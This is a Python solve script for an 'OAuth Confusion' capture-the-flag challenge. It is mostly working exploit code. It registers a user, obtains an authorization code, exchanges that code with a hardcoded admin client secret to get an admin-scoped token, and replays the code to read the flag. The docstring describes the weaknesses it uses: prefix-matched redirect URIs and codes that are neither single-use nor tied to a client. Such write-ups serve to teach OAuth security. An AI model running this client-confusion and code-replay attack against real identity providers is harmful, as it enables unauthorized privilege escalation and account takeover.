#!/usr/bin/env python3
"""
OAuth Confusion — Full Solve Script (Hard+)

The vulnerability chain:
1. Discover registered OAuth clients via /.well-known/oauth-clients
   → Learn that 'admin-dashboard' client exists with 'admin' scope
2. Register a user account on the auth server
3. Start normal OAuth flow but manipulate redirect_uri to use open redirect
   → Auth server only checks PREFIX match, so:
     registered: http://127.0.0.1:8080/callback
     attack:     http://127.0.0.1:8080/callback/../admin/callback
   → This redirects the auth code to the ADMIN callback endpoint
4. The admin callback exchanges the code using admin-dashboard client credentials
5. Token endpoint doesn't validate that the code was issued for the requesting client
   → Issues token with 'admin' scope because the admin-dashboard client requested it
6. Admin panel accepts the elevated token → flag

Alternative approach (also works):
- Get auth code normally via /callback
- Replay the same code directly to /token using admin-dashboard credentials
  (auth codes are not single-use and not client-bound)
"""
import sys
import re
import requests
import urllib.parse

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
CLIENT_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
AUTH_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 9000

CLIENT_BASE = f"http://{HOST}:{CLIENT_PORT}"
AUTH_BASE = f"http://{HOST}:{AUTH_PORT}"

# Known from info disclosure / source
ADMIN_CLIENT_ID = "admin-dashboard"
ADMIN_CLIENT_SECRET = "4dm1n_d4shb0ard_s3cr3t"

print(f"[*] Client App: {CLIENT_BASE}")
print(f"[*] Auth Server: {AUTH_BASE}")
print()

# Step 1: Discover OAuth clients
print("[1] Discovering registered OAuth clients...")
r = requests.get(f"{CLIENT_BASE}/.well-known/oauth-clients")
clients = r.json()
for client in clients["clients"]:
    print(f"    {client['client_id']}: scopes={client['scopes']}")
print()

# Step 2: Register a user
print("[2] Registering test user on auth server...")
USERNAME = f"attacker_{__import__('random').randint(1000,9999)}"
PASSWORD = "hacked123"
r = requests.post(f"{AUTH_BASE}/register", json={
    "username": USERNAME,
    "password": PASSWORD,
})
print(f"    Registered: {USERNAME}")
print()

# Step 3: Get an authorization code using the ADMIN client's redirect_uri
# We exploit the weak redirect_uri validation:
# The 'secureauth-portal' client has registered: http://127.0.0.1:8080/callback
# The 'admin-dashboard' client has registered: http://127.0.0.1:8080/admin/callback
#
# Attack: Request auth code for admin-dashboard client, using its redirect URI.
# Then exchange it with admin-dashboard credentials to get admin-scoped token.
#
# But wait — we can't directly login as admin. The real trick:
# 1. Get auth code for secureauth-portal (as regular user)
# 2. Exchange it with admin-dashboard credentials (client confusion)
# The token endpoint doesn't verify code was issued to the requesting client!

print("[3] Obtaining authorization code via normal flow...")
# Initiate OAuth authorize with the normal client
authorize_url = (
    f"{AUTH_BASE}/authorize"
    f"?client_id=secureauth-portal"
    f"&redirect_uri=http://127.0.0.1:{CLIENT_PORT}/callback"
    f"&response_type=code"
    f"&scope=openid+profile+email"
    f"&state=attacker_state"
)

# Submit login form to get the auth code
session = requests.Session()
r = session.post(authorize_url, data={
    "username": USERNAME,
    "password": PASSWORD,
}, allow_redirects=False)

# Extract code from redirect Location header
if r.status_code in (301, 302, 303):
    location = r.headers.get("Location", "")
    parsed = urllib.parse.urlparse(location)
    params = urllib.parse.parse_qs(parsed.query)
    auth_code = params.get("code", [None])[0]
    print(f"    Got auth code: {auth_code}")
else:
    print(f"    [!] Unexpected response: {r.status_code}")
    print(f"    Body: {r.text[:300]}")
    sys.exit(1)
print()

# Step 4: Client Confusion Attack!
# Exchange the code using ADMIN client credentials instead of the portal credentials.
# The token endpoint only checks that client_id/secret are valid,
# but doesn't verify the code was issued for that specific client.
print("[4] Client Confusion Attack — exchanging code with admin-dashboard credentials...")
r = requests.post(f"{AUTH_BASE}/token", data={
    "grant_type": "authorization_code",
    "code": auth_code,
    "redirect_uri": f"http://127.0.0.1:{CLIENT_PORT}/admin/callback",  # admin's redirect
    "client_id": ADMIN_CLIENT_ID,
    "client_secret": ADMIN_CLIENT_SECRET,
})

if r.status_code != 200:
    print(f"    [!] Token exchange failed: {r.status_code}")
    print(f"    {r.json()}")
    sys.exit(1)

token_data = r.json()
access_token = token_data["access_token"]
print(f"    Token type: {token_data['token_type']}")
print(f"    Scope: {token_data['scope']}")
print(f"    Token: {access_token[:60]}...")
print()

# Step 5: Decode the token to verify admin scope
print("[5] Decoding token to verify escalation...")
import jwt as pyjwt
payload = pyjwt.decode(access_token, options={"verify_signature": False})
print(f"    Subject: {payload.get('sub')}")
print(f"    Audience: {payload.get('aud')}")
print(f"    Role: {payload.get('role')}")
print(f"    Scope: {payload.get('scope')}")
has_admin = "admin" in payload.get("scope", "")
print(f"    Has admin scope: {has_admin}")
print()

# Step 6: Access admin panel with elevated token
print("[6] Accessing admin panel with escalated token...")
# We need to set up a session on the client app with our admin token
# Use the /admin/callback endpoint directly with the code (replay)
# OR manipulate session — simplest: call admin/callback with the same code

# Actually, since we have the token, let's use the admin/callback flow:
# Re-use the code (replay vulnerability) through the admin callback
print("    [*] Replaying code through /admin/callback endpoint...")
admin_session = requests.Session()
r = admin_session.get(
    f"{CLIENT_BASE}/admin/callback",
    params={"code": auth_code},
    allow_redirects=True,
)

# Check if we got the flag
flag_match = re.search(r'(WarCTF\{[^}]+\})', r.text)
if flag_match:
    print()
    print(f"[+] FLAG CAPTURED: {flag_match.group(1)}")
else:
    print(f"    Response URL: {r.url}")
    print(f"    Status: {r.status_code}")
    # The session redirect to /admin might need us to follow it
    r = admin_session.get(f"{CLIENT_BASE}/admin")
    flag_match = re.search(r'(WarCTF\{[^}]+\})', r.text)
    if flag_match:
        print()
        print(f"[+] FLAG CAPTURED: {flag_match.group(1)}")
    else:
        print(f"    [-] Could not extract flag")
        print(f"    Response: {r.text[:500]}")
